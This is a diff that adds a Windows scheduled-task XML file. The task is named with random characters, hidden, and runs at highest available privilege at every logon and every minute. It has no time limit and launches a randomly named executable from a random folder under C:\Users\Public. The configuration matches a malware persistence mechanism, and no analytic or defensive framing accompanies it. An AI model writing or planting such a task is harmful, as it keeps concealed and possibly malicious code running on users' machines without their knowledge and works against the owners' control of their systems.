@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description />
+    <URI>\M2Qrn</URI>
+  </RegistrationInfo>
+  <Principals>
+    <Principal id="Author">
+      <GroupId>S-1-5-32-545</GroupId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Hidden>true</Hidden>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <Priority>4</Priority>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+  </Settings>
+  <Triggers>
+    <LogonTrigger />
+    <TimeTrigger>
+      <StartBoundary>2009-04-23T00:00:00</StartBoundary>
+      <Repetition>
+        <Interval>PT1M</Interval>
+      </Repetition>
+    </TimeTrigger>
+  </Triggers>
+  <Actions Context="Author">
+    <Exec>
+      <Command>C:\Users\Public\2gZsbf\4zZkWf.exe</Command>
+      <WorkingDirectory>C:\Users\Public\2gZsbf\</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>
